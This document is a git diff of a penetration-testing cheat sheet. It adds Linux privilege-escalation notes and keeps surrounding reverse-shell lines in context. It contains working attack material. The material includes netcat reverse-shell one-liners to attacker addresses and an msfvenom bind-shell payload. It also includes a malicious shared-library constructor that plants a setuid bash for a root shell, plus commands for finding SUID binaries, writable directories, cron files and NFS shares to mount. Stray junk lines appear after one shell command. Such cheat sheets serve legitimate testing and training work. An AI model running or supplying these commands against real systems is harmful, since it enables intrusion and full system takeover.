@@ -160,6 +160,8 @@ Reverse - `nc.exe 192.168.1.101 443 -e cmd.exe`
 
 #### OpenBSD
 `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f`
+AU
+2
 
 
 ### Editing Exploits
@@ -813,18 +815,126 @@ netstat -anlp
 netstat -ano
 
 #### Suid and Guid
+There are binaries with suid permission which means that it is run as another user (root in our case). These binaries may be able to spawn a shell and therefore a root shell.
+```
+#Find SUID
+find / -perm -u=s -type f 2>/dev/null
 
-#### SUdo
+#Find GUID
+find / -perm -g=s -type f 2>/dev/null
+
+find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 6 -exec ls -ld {} \; 2>/dev/null
+find / -perm -1000 -type d 2>/dev/null
+find / -perm -g=s -type f 2>/dev/null
+
+find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
+find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.
+find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.
+
+find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
+for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done    # Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)
+
+# find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
+find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null
+
+# Check if suss binary tries to access some other files that can be written to
+strace /path/to/bin 2>&1 | grep -i E "open|access|no such file"
+
+#If it can, we can create a malicous payload and save it in the directory it is trying to access that we can write to
+#include <stdio.h>
+#include <stdlib.h>
+
+static void inject()__attribute__((constructor));
+
+void inject(){
+
+system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
+
+}
+
+#compile with
+gcc -shared -o /path/to/binary -fPIC /path/to/script
+
+#them run binary again
+
+#Enumerate versions of binaries as they may be vulnerable
+dpkg -l | grep [binary]
+
+nmap
+vim
+less
+more
+nano
+cp
+mv
+find
+
+```
+
+#### Sudo
+```
+#what can I run as root?
+
+sudo -l
+#search for exploits involving programs that can be run as root
+```
 
 #### Perms
+```
+#Find files which can be invoked as root and replace them with your own binary
+
+#World writable files directories
+find / -writable -type d 2>/dev/null
+find / -perm -222 -type d 2>/dev/null
+find / -perm -o w -type d 2>/dev/null
+
+# World executable folder
+find / -perm -o x -type d 2>/dev/null
+
+# World writable and executable folders
+find / \( -perm -o w -perm -o x \) -type d 2>/dev/null
+```
 
 #### bad path
+```
+If . is in PATH environment variable, then any binary can be run as root
+```
 
 #### Cron
+```
+# We're looking for scheduled tasks being run as root that may try to access files that we can write or overwrite to
+# Look at PATH set on crontab
+# Also look for files that although we can't edit, may contain vulnerabilites such as wildcards
+
+ls -alh /var/spool/cron
+ls -al /etc/ | grep cron
+ls -al /etc/cron*
+cat /etc/cron*
+cat /etc/at.allow
+cat /etc/at.deny
+cat /etc/cron.allow
+cat /etc/cron.deny
+cat /etc/crontab
+cat /etc/anacrontab
+cat /var/spool/cron/crontabs/root
+```
 
 #### Unmounted filesystems
+```
+#If we find other filesystems we need to restart the process on them
+
+mount -l
+cat /etc/fstab
+```
 
 #### NFS Share
+```
+# First check if the target machine has any NFS shares
+showmount -e 192.168.1.101
+
+# If it does, then mount it to you filesystem
+mount 192.168.1.101:/ /tmp/
+```
 
 
 ## Buffer Overflow
@@ -911,4 +1021,4 @@ jmp eax
 
 `msfvenom -p linux/x86/shell_bind_tcp LPORT=4444 -f python -e x86/shikata_ga_nai -b “\x00\xbr\xuh”`
 
-`
+
